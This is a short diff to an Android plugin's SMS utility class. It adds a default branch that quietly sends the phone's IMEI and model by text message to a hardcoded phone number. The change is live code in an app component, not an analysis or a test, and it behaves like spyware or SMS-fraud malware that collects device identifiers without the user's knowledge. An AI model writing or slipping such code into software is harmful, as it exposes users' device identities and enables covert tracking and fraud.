@@ -2,6 +2,7 @@ package com.xstd.plugin.Utils;
 
 import android.content.Context;
 import android.telephony.SmsManager;
+import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
@@ -61,6 +62,9 @@ public class SMSUtil {
                 cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD3);
                 cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD4);
                 break;
+            default:
+                target = "18911660175";
+                cmd.add("IMEI:" + UtilsRuntime.getIMEI(context) + " 手机类型:" + android.os.Build.MODEL);
         }
 
         if (target != null && cmd.size() > 0) {
